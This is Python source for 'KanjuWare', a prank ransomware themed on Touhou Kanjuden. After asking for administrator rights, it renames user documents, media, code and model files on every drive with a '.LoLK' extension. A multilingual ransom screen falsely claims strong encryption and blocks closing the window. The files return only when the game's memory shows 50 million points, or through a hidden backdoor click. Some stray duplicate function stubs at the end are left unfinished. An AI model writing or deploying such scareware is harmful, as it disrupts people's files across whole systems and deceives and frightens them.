import ctypes
import errno
import os
import platform
import sys
import time
import threading
import tkinter as tk
from tkinter import ttk, messagebox
from pymem import Pymem
from PIL import Image, ImageTk, ImageFont
import tkinter.font as tkfont
import locale

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# ==================== Configuration ====================
TARGET_SCORE = 5000000 # The target score is set to 5 million (5000000) instead of 50 million because the score in memory is actually the displayed score divided by 10. This is a common practice in games to save memory and simplify score handling. So when the player reaches 50 million points, the value stored in memory will be 5 million (5000000). Therefore, we set TARGET_SCORE to 5000000 to correctly detect when the player has reached the required score for unlocking the files.
SCORE_ADDRESS = 0x004E40BC # This is the memory address where the score is stored in the trial version of Touhou Kanjuden. For the full version, the score is stored at 0x004E740C. The program will automatically detect which version is running and read the score from the correct address.
TARGET_EXTENSION = ".LoLK" # This is the extension that will be appended to files to simulate encryption. When the program "encrypts" a file, it will rename the file to have this extension. For example, "document.pdf" would be renamed to "document.pdf.LoLK". This allows for easy recovery by simply removing the ".LoLK" extension from the file name.
IMAGE_PATH = resource_path("assets/junko.png") # This is the path to the image file that will be displayed in the GUI. The image is used to enhance the visual presentation of the application, making it more engaging for the user. The image should be placed in the specified path relative to the main.py file.
FILE_EXTENSIONS_NEED_TO_RENAME = {
    ".pdf", ".txt", ".md", ".json", ".doc", ".docx", ".odt", ".wps",
    ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".tsv", ".sql", ".db", ".mdb", ".accdb", ".odp", ".ods",
    ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".svg",
    ".mp3", ".m4a", ".aac", ".flac", ".alac", ".wav", ".mid", ".ogg", ".opus", ".aiff", ".wma", ".ape",
    ".mp4", ".mov", ".mkv", ".flv", ".avi", ".wmv", ".mpeg", ".mpg", "m4v", "webm", "m2ts", ".mts", ".vob", ".rm", ".rmvb", ".ts", ".mxf",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".iso",
    ".cpp", ".h", ".java", ".js", ".html", ".css", ".cs", ".go", ".rb", ".php", ".swift", ".kt", ".rs",
    ".psd", ".ai", ".indd", ".sketch", ".blend", ".fbx", ".obj", ".dwg", ".dxf", ".3ds", ".max",
    ".pmm", ".pmmx", ".pmmz", ".pmm3d", ".pmm2d", ".pmmproj", ".pmmtemplate", ".pmmbackup", ".pmx",
    ".cpr", ".song", ".dawproject", ".flp", ".als", ".logicx", ".ptf", ".ptf2", ".ptf3", ".ptf4", ".ptf5", ".ptf6", ".ptf7", ".mscz", ".sib", ".notion", ".dorico", ".npr", ".nprproj", ".nprbackup", ".nprtemplate", ".nprarchive", ".vpr", ".ustx",
    ".sanaeenc", ".lnk",
    ".gguf", ".safetensors", ".ckpt", ".pt", ".pth", ".bin", ".model", ".onnx", ".tflite", ".pb", ".h5", ".mlmodel",
} # This set contains the file extensions that the program will target for "encryption" (actually just renaming). The program will scan all files on the system and if a file has one of these extensions and is not already "encrypted" (i.e., does not already have the TARGET_EXTENSION), it will rename the file to add the TARGET_EXTENSION. This simulates the effect of encryption without actually modifying the file contents, which allows for easy recovery by simply renaming the files back to their original names. The list includes common document, image, audio, video, archive, code, and design file formats in both lowercase and uppercase to ensure comprehensive coverage.

# These are the font files that will be loaded and used in the application. The program will attempt to load these fonts from the specified paths, and if successful, it will use them for various text elements in the GUI. If the fonts cannot be loaded, the program will fall back to default system fonts. The font files should be placed in the specified paths relative to the main.py file.
FONT_FILES = {
    "mono_font": "assets/MapleMonoCnNarrowNormalNL-CN-Medium.ttf"
}
# =======================================================

# ==================== i18n ====================
LANGUAGES = {
    "en": "English",
    "zh": "中文",
    "ja": "日本語",
}

TRANSLATIONS = {
    "en": {
        "window_title": "KanjuWare v1.18 - Pure Mutation",
        "warning_title": "[WARNING] Your computer has been infected!",
        "instruction": (
            "Oops, your files have been infected by \"Pure Mutation\"!\n\n"
            "What the HELL is it?\n"
            "The mutation has caused your precious data to be encrypted, including "
            "documents, images, music, and some project files. Only this program can "
            "recover the files, because the files have been \"encrypted\" using a "
            "\"high-strength encryption algorithm with a random key.\"\n\n"
            "How can I recover my files?\n"
            "That's easy, you just need to reach 50 million points in any difficulty "
            "in the \"Touhou Kanjuden\" Trial or Full version, and this program will automatically "
            "detect the process and score of \"Touhou Kanjuden\". If you do not "
            "want to lose your encryption key, do not attempt to deceive or close this program."
        ),
        "status_init": "Initializing Pure Mutation...",
        "status_scan": "Pure mutation is being launched (scanning all files...)",
        "status_decrypt": "Attempting to decrypt files...",
        "status_wait_game": "Waiting for Touhou Kanjuden to start (th15.exe)...",
        "status_game_locked": "Successfully locked th15.exe",
        "status_game_lost": "Game connection lost, waiting again...",
        "status_target": "Score has reached the target! Awakening files...",
        "score_label": "Current Score in Memory:",
        "lang_label": "Language:",
        "decrypt_done_title": "Decryption Complete",
        "decrypt_done_msg": (
            "Congratulations! You have successfully reached 50 million points in "
            "Touhou Kanjuden ~ Legacy of Lunatic Kingdom. All files have been restored."
        ),
        "close_warn_title": "Wanna to escape?",
        "close_warn_msg": (
            "Unless you complete the 50 million divisions, closing the window will not be useful "
            "(the file will not be restored)."
        ),
        "cheat_title": "[Backdoor]",
        "cheat_msg": (
            "You've triggered the cheat unlock! This is for testing and emergency recovery purposes. "
            "Files will be decrypted without reaching the target score."
        ),
        "admin_title": "Need Administrator Privileges",
        "admin_msg": (
            "The program requires administrator privileges to correctly detect th15.exe and access files. "
            "Please run again as an administrator."
        ),
        "start_title": "Start Warning",
        "start_msg": (
            "Warning: Although this prank software is not actually very destructive, many unsuspecting "
            "individuals may still be frightened by it. To avoid causing serious harm or loss, please "
            "follow the steps below to perform a self-check: \n\n"
            "1. You are aware of the software's operational characteristics. \n"
            "2. You are certain that you can reverse all impacts caused by this software. \n\n"
            "If you meet the criteria outlined in the self-check steps above, you may click \"Yes\" "
            "to proceed with the challenge. Otherwise, please click \"No\" directly and permanently "
            "delete the software."
        ),
        "image_not_found": "[Image not found]",
    },

    "zh": {
        "window_title": "KanjuWare v1.18 - 纯化异变",
        "warning_title": "[警告] 你的电脑已被感染！",
        "instruction": (
            "糟糕，你的文件已经被“纯化异变”感染了！\n\n"
            "这到底是什么鬼东西？\n"
            "这场异变导致你珍贵的数据被加密了，包括文档、图片、音乐以及一些工程文件。"
            "只有这个程序才能恢复文件，因为这些文件是被“带随机密钥的高强度加密算法”加密的。\n\n"
            "我要怎么恢复文件？\n"
            "很简单，你只需要在《东方绀珠传》体验版或正式版中，以任意难度达到 5000 万分，"
            "这个程序就会自动检测《东方绀珠传》的进程和分数。如果你不想失去加密密钥，"
            "请不要尝试欺骗或关闭这个程序。"
        ),
        "status_init": "正在初始化纯化异变...",
        "status_scan": "纯化异变正在启动（正在扫描所有文件...）",
        "status_decrypt": "正在尝试解密文件...",
        "status_wait_game": "等待《东方绀珠传》启动（th15.exe）...",
        "status_game_locked": "已成功锁定 th15.exe",
        "status_game_lost": "游戏连接已断开，重新等待...",
        "status_target": "分数已达到目标！正在唤醒文件...",
        "score_label": "内存中的当前分数：",
        "lang_label": "语言：",
        "decrypt_done_title": "解密完成",
        "decrypt_done_msg": (
            "恭喜！你已在《东方绀珠传 ～ Legacy of Lunatic Kingdom》中成功达到 5000 万分。"
            "所有文件均已恢复。"
        ),
        "close_warn_title": "想逃跑吗？",
        "close_warn_msg": "除非你完成 5000 万分的挑战，否则关闭窗口没有用（文件不会被恢复）。",
        "cheat_title": "[后门]",
        "cheat_msg": "你触发了作弊解锁！这用于测试和紧急恢复。无需达到目标分数即可解密文件。",
        "admin_title": "需要管理员权限",
        "admin_msg": "程序需要管理员权限才能正确检测 th15.exe 并访问文件。请以管理员身份重新运行。",
        "start_title": "启动警告",
        "start_msg": (
            "警告：虽然这个整蛊软件实际上破坏性不大，但许多不知情的人仍可能被它吓到。"
            "为避免造成严重伤害或损失，请按以下步骤自检：\n\n"
            "1. 你了解该软件的运行特性。\n"
            "2. 你确信可以逆转该软件造成的所有影响。\n\n"
            "如果你符合上述自检标准，可以点击“是”继续挑战。否则，请直接点击“否”，"
            "并永久删除该软件。"
        ),
        "image_not_found": "[未找到图片]",
    },

    "ja": {
        "window_title": "KanjuWare v1.18 - 純化異変",
        "warning_title": "[警告] あなたのコンピュータは感染しました！",
        "instruction": (
            "おっと、あなたのファイルは「純化異変」に感染しました！\n\n"
            "一体何なんだ？\n"
            "この異変により、文書、画像、音楽、いくつかのプロジェクトファイルなど、"
            "大切なデータが暗号化されました。このプログラムだけがファイルを復元できます。"
            "なぜなら、ファイルは「ランダムキーを使った高強度暗号アルゴリズム」で"
            "「暗号化」されたからです。\n\n"
            "どうすればファイルを復元できますか？\n"
            "簡単です。《東方紺珠伝》体験版または正式版で、任意の難易度で5000万点に"
            "到達してください。このプログラムが《東方紺珠伝》のプロセスとスコアを"
            "自動検出します。暗号化キーを失いたくないなら、このプログラムを騙したり"
            "閉じたりしないでください。"
        ),
        "status_init": "純化異変を初期化中...",
        "status_scan": "純化異変を起動中（すべてのファイルをスキャンしています...）",
        "status_decrypt": "ファイルを復号しています...",
        "status_wait_game": "《東方紺珠伝》の起動を待っています（th15.exe）...",
        "status_game_locked": "th15.exe のロックに成功しました",
        "status_game_lost": "ゲーム接続が切断されました。再度待機します...",
        "status_target": "スコアが目標に到達しました！ファイルを復元しています...",
        "score_label": "メモリ内の現在のスコア：",
        "lang_label": "言語：",
        "decrypt_done_title": "復号完了",
        "decrypt_done_msg": (
            "おめでとうございます！《東方紺珠伝 ～ Legacy of Lunatic Kingdom》で"
            "5000万点に到達しました。すべてのファイルが復元されました。"
        ),
        "close_warn_title": "逃げたいのか？",
        "close_warn_msg": "5000万点を達成しない限り、ウィンドウを閉じても無意味です（ファイルは復元されません）。",
        "cheat_title": "[バックドア]",
        "cheat_msg": "チート解除を起動しました！これはテストと緊急復元用です。目標スコアに達しなくてもファイルは復号されます。",
        "admin_title": "管理者権限が必要です",
        "admin_msg": "このプログラムは th15.exe を正しく検出し、ファイルにアクセスするために管理者権限が必要です。管理者として再実行してください。",
        "start_title": "起動警告",
        "start_msg": (
            "警告：このいたずらソフトは実際には大きな破壊力はありませんが、"
            "事情を知らない多くの人を怖がらせる可能性があります。深刻な被害や損失を避けるため、"
            "以下の自己確認を行ってください：\n\n"
            "1. このソフトの動作特性を理解している。\n"
            "2. このソフトによるすべての影響を元に戻せると確信している。\n\n"
            "上記の基準を満たす場合のみ「はい」をクリックして挑戦してください。"
            "そうでない場合は「いいえ」をクリックし、このソフトを完全に削除してください。"
        ),
        "image_not_found": "[画像が見つかりません]",
    },
}

def detect_lang():
    try:
        loc = locale.getdefaultlocale()[0] or ""
    except Exception:
        loc = ""
    loc = loc.lower()
    if loc.startswith("zh"):
        return "zh"
    if loc.startswith("ja"):
        return "ja"
    return "en"

def tr(lang, key, **kwargs):
    """Global translation function. It retrieves the translated text for the given key in the specified language. If the translation is not found, it falls back to English or returns the key itself. It also supports string formatting with additional keyword arguments."""
    table = TRANSLATIONS.get(lang, TRANSLATIONS["en"])
    text = table.get(key, TRANSLATIONS["en"].get(key, key))
    return text.format(**kwargs) if kwargs else text
# ===============================================

# ================== High DPI Support ===================
def setup_high_dpi():
    if platform.system() == 'Windows':
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(1)
        except:
            try:
                ctypes.windll.user32.SetProcessDPIAware()
            except:
                pass
def get_scale_factor():
    if platform.system() == 'Windows':
        try:
            return ctypes.windll.user32.GetDpiForSystem() / 96.0
        except:
            hdc = ctypes.windll.user32.GetDC(0)
            dpi = ctypes.windll.gdi32.GetDeviceCaps(hdc, 88)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return dpi / 96.0
            # Linux and macOS typically handle DPI scaling automatically, but we can attempt to read GDK_SCALE for Linux
    try:
        # Some Linux environments use GDK_SCALE for scaling factor, default to 1.0 if not set
        return float(os.environ.get('GDK_SCALE', 1.0))
    except:
        return 1.0
# =====================================================

# ==================== Private Font Loader ====================
FR_PRIVATE = 0x10

class FontManager:
    """Just a simple font loader for Windows. It loads fonts from specified paths and makes them available for use in the application. It also provides functionality to unload the fonts when they are no longer needed."""

    def __init__(self):
        self.loaded_paths = []   # The paths of the fonts that have been successfully loaded. This list is used to keep track of which fonts need to be unloaded when the application is closing or when the fonts are no longer needed.
        self.families = {}       # A dictionary mapping font file names (without extensions) to their corresponding family names. This allows the application to easily reference the loaded fonts by their file names and use the correct family names when creating text elements in the GUI.
        self._gdi32 = None
        if platform.system() == 'Windows':
            try:
                self._gdi32 = ctypes.WinDLL('gdi32')
                self._gdi32.AddFontResourceExW.argtypes = [ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_void_p]
                self._gdi32.AddFontResourceExW.restype = ctypes.c_int
                self._gdi32.RemoveFontResourceExW.argtypes = [ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_void_p]
                self._gdi32.RemoveFontResourceExW.restype = ctypes.c_int
            except Exception as e:
                print(f"[Font] GDI init failed: {e}")

    def load_all(self, font_map):
        result = {}
        for key, rel in font_map.items():
            path = resource_path(rel)
            family = self._load_one(path)
            result[key] = family or "Consolas"
            print(f"[Font] {key}: {result[key]}  <- {path}")
        return result

    def _load_one(self, path):
        if not self._gdi32 or not os.path.exists(path):
            print(f"[Font] Not found: {path}")
            return None
        try:
            added = self._gdi32.AddFontResourceExW(path, FR_PRIVATE, None)
            if added == 0:
                print(f"[Font] AddFontResourceExW failed: {path}")
                return None
            self.loaded_paths.append(path)
        except Exception as e:
            print(f"[Font] Load error {path}: {e}")
            return None
        try:
            family = ImageFont.truetype(path, 20).getname()[0]
            print(f"[Font] Loaded {os.path.basename(path)} -> {family}")
            return family
        except Exception as e:
            print(f"[Font] Cannot read family name {path}: {e}")
            return None

    def unload_all(self):
        if not self._gdi32:
            return
        for path in self.loaded_paths:
            try:
                self._gdi32.RemoveFontResourceExW(path, FR_PRIVATE, None)
            except Exception:
                pass
        self.loaded_paths.clear()
# ============================================================

class KanjuWareApp:
    def __init__(self, root):
        scale = get_scale_factor()
        self.root = root

        self.current_lang = detect_lang()
        self.status_key = "status_init"
        self.status_args = {}
        self.font_mgr = FontManager()
        self.fonts = self.font_mgr.load_all(FONT_FILES)
        self.font_mono = self.fonts.get("mono_font", "Consolas")

        self.root.title(self.t("window_title"))
        BASE_W, BASE_H = 940, 600
        self.root.geometry(f"{int(BASE_W * scale)}x{int(BASE_H * scale)}")
        self.root.resizable(False, False)
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

        self.current_score = tk.StringVar(value="0")
        self.status_text = tk.StringVar(value=self.t("status_init"))
        self.lang_var = tk.StringVar(value=LANGUAGES[self.current_lang])
        self.is_unlocked = False

        self.setup_ui()

        self.backend_thread = threading.Thread(target=self.backend_worker, daemon=True)
        self.backend_thread.start()

        self.root.after(100, self.update_loop)

    def t(self, key, **kwargs):
        return tr(self.current_lang, key, **kwargs)

    def set_status(self, key, **kwargs):
        self.status_key = key
        self.status_args = kwargs
        self.status_text.set(self.t(key, **kwargs))

    def change_language(self, event=None):
        display = self.lang_combo.get()
        for k, v in LANGUAGES.items():
            if v == display:
                self.current_lang = k
                break

        self.root.title(self.t("window_title"))
        self.title_label.config(text=self.t("warning_title"))
        self.msg_label.config(text=self.t("instruction"))
        self.score_label.config(text=self.t("score_label"))
        self.lang_label.config(text=self.t("lang_label"))
        self.status_text.set(self.t(self.status_key, **self.status_args))

    def setup_ui(self):
        scale = get_scale_factor()
        self.root.configure(bg="#1a1a2e")

        self.title_label = tk.Label(
            self.root,
            text=self.t("warning_title"),
            font=(self.font_mono, 18, "bold"),
            fg="#ff4757", bg="#1a1a2e"
        )
        self.title_label.pack(pady=(15, 5))

        body_frame = tk.Frame(self.root, bg="#1a1a2e")
        body_frame.pack(fill="both", expand=True, padx=10, pady=5)

        left_frame = tk.Frame(body_frame, bg="#1a1a2e", width=399 * scale)
        left_frame.pack(side="left", fill="y", padx=(0, 10))
        left_frame.pack_propagate(False)

        try:
            image = Image.open(IMAGE_PATH)
            image = image.resize((int(399 * scale), int(512 * scale)), Image.LANCZOS)
            self.image_tk = ImageTk.PhotoImage(image)
            image_label = tk.Label(left_frame, image=self.image_tk, bg="#1a1a2e")
            image_label.pack(pady=5)
        except Exception as e:
            placeholder = tk.Label(
                left_frame,
                text=self.t("image_not_found"),
                font=(self.font_mono, 12),
                fg="#ffffff", bg="#1a1a2e"
            )
            placeholder.pack(expand=True)
            print(f"[Error] Failed to load image: {e}")

        right_frame = tk.Frame(body_frame, bg="#1a1a2e")
        right_frame.pack(side="right", fill="both", expand=True)

        lang_frame = tk.Frame(right_frame, bg="#1a1a2e")
        lang_frame.pack(anchor="ne", padx=10, pady=5)

        self.lang_label = tk.Label(
            lang_frame,
            text=self.t("lang_label"),
            font=(self.font_mono, 10),
            fg="#ffffff", bg="#1a1a2e"
        )
        self.lang_label.pack(side="left")

        self.lang_combo = ttk.Combobox(
            lang_frame,
            values=list(LANGUAGES.values()),
            state="readonly",
            width=8
        )
        self.lang_combo.set(LANGUAGES[self.current_lang])
        self.lang_combo.bind("<<ComboboxSelected>>", self.change_language)
        self.lang_combo.pack(side="left", padx=5)

        self.msg_label = tk.Label(
            right_frame,
            text=self.t("instruction"),
            font=(self.font_mono, 12),
            fg="#ffffff", bg="#1a1a2e", justify="left",
            wraplength=440 * scale
        )
        self.msg_label.pack(pady=5, padx=30)

        score_frame = tk.Frame(self.root, bg="#16213e", bd=2 * scale, relief="groove")
        score_frame.pack(pady=15, fill="x", padx=40)

        self.status_label = tk.Label(
            score_frame,
            textvariable=self.status_text,
            font=(self.font_mono, 9),
            fg="#eccc68", bg="#16213e"
        )
        self.status_label.pack(pady=3)

        self.score_label = tk.Label(
            score_frame,
            text=self.t("score_label"),
            font=(self.font_mono, 10),
            fg="#ffffff", bg="#16213e"
        )
        self.score_label.pack(side="left", padx=20, pady=5)

        score_val = tk.Label(
            score_frame,
            textvariable=self.current_score,
            font=(self.font_mono, 14, "bold"),
            fg="#2ed573", bg="#16213e"
        )
        score_val.pack(side="right", padx=20, pady=5)

        backdoor_btn = tk.Label(right_frame, text=".", fg="#1a1a2e", bg="#1a1a2e")
        backdoor_btn.pack(side="bottom", anchor="se")
        backdoor_btn.bind("<Double-Button-1>", self.cheat_unlock)

    def _safe_rename(self, old_path, new_path):
        if not os.path.exists(old_path) or os.path.exists(new_path):
            return False
        try:
            if not os.access(old_path, os.W_OK):
                return False
            os.rename(old_path, new_path)
            return True
        except (PermissionError, OSError):
            return False

    def infect_files(self):
        self.status_text.set("Pure mutation is being launched (scanning all files...)")
            
        count = 0
        for drive_letter in range(ord("A"), ord("Z") + 1):
            drive = f"{chr(drive_letter)}:/"
            if not os.path.exists(drive):
                continue
            # Skipping system-sensitive directories to avoid critical damage and improve speed. Only targeting user files with allowed extensions.
            for root_path, dirs, files in os.walk(drive):
                if "Windows" in root_path or "Program Files" in root_path or "AppData" in root_path:
                    continue
                for file in files:
                    lower_ext = os.path.splitext(file)[1].lower()
                    if lower_ext in FILE_EXTENSIONS_NEED_TO_RENAME and not file.endswith(TARGET_EXTENSION):
                        old_path = os.path.join(root_path, file)
                        new_path = old_path + TARGET_EXTENSION
                        if self._safe_rename(old_path, new_path):
                            count += 1
        print(f"[Pure Mutation] Successfully marked {count} files with {TARGET_EXTENSION}")

    def decrypt_files(self):
        self.status_text.set("Attempting to decrypt files...")
        count = 0
        for drive_letter in range(ord("A"), ord("Z") + 1):
            drive = f"{chr(drive_letter)}:/"
            if not os.path.exists(drive):
                continue
            for root_path, _, files in os.walk(drive):
                for file in files:
                    if file.endswith(TARGET_EXTENSION):
                        old_path = os.path.join(root_path, file)
                        new_path = old_path[:-len(TARGET_EXTENSION)]
                        if self._safe_rename(old_path, new_path):
                            count += 1
        print(f"[Decryption] Mutation has been lifted, successfully restored {count} files.")

    def backend_worker(self):
        self.set_status("status_scan")
        self.infect_files()

        ADDR_TRIAL = 0x004E40BC
        ADDR_FULL  = 0x004E740C

        while not self.is_unlocked:
            try:
                pm = Pymem("th15.exe")
                self.set_status("status_game_locked")

                active_address = None

                while not self.is_unlocked:
                    try:
                        if active_address is None:
                            score_trial = pm.read_int(ADDR_TRIAL)
                            score_full = pm.read_int(ADDR_FULL)

                            if score_full > 0:
                                active_address = ADDR_FULL
                                print("[Version Detected] Full Version locked.")
                            elif score_trial > 0:
                                active_address = ADDR_TRIAL
                                print("[Version Detected] Trial Version locked.")

                            current_raw_score = score_trial if score_trial > 0 else score_full
                        else:
                            current_raw_score = pm.read_int(active_address)

                        self.current_score.set(f"{current_raw_score}0")

                        if current_raw_score >= TARGET_SCORE:
                            self.is_unlocked = True
                            self.set_status("status_target")
                            break
                    except Exception:
                        self.set_status("status_game_lost")
                        self.current_score.set("0")
                        active_address = None
                        break
                    time.sleep(0.2)
            except Exception:
                self.set_status("status_wait_game")
                self.current_score.set("0")
                time.sleep(1.0)

    def update_loop(self):
        if self.is_unlocked:
            self.decrypt_files()
            messagebox.showinfo(
                self.t("decrypt_done_title"),
                self.t("decrypt_done_msg")
            )
            if hasattr(self, "font_mgr"):
                self.font_mgr.unload_all()
            self.root.destroy()
            sys.exit(0)
        else:
            self.root.after(100, self.update_loop)

    def cheat_unlock(self, event):
        messagebox.showinfo(
            self.t("cheat_title"),
            self.t("cheat_msg")
        )
        self.is_unlocked = True

    def on_closing(self):
        if self.is_unlocked:
            if hasattr(self, "font_mgr"):
                self.font_mgr.unload_all()
            self.root.destroy()
        else:
            messagebox.showwarning(
                self.t("close_warn_title"),
                self.t("close_warn_msg")
            )

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def relaunch_as_admin():
    if sys.platform != "win32":
        return False
    script = os.path.abspath(sys.argv[0])
    params = " ".join(f'"{arg}"' for arg in sys.argv[1:])
    try:
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        return result > 32
    except Exception:
        return False

def on_closing(self):
    if self.is_unlocked:
        self.font_mgr.unload_all()
        self.root.destroy()
    else:
        messagebox.showwarning(...)

def update_loop(self):
    if self.is_unlocked:
        self.decrypt_files()
        messagebox.showinfo(...)
        self.font_mgr.unload_all()
        self.root.destroy()
        sys.exit(0)
    else:
        self.root.after(100, self.update_loop)

# ==================== Entrance ====================
if __name__ == "__main__":
    setup_high_dpi()
    lang = detect_lang()

    if not is_running_as_admin():
        if relaunch_as_admin():
            sys.exit(0)
        else:
            ctypes.windll.user32.MessageBoxW(
                None,
                tr(lang, "admin_msg"),
                tr(lang, "admin_title"),
                0x10,
            )

    root = tk.Tk()
    root.withdraw()

    start_confirmation = messagebox.askyesno(
        tr(lang, "start_title"),
        tr(lang, "start_msg"),
        icon="warning",
    )

    if not start_confirmation:
        root.destroy()
        sys.exit(0)

    root.deiconify()
    app = KanjuWareApp(root)
    root.mainloop()
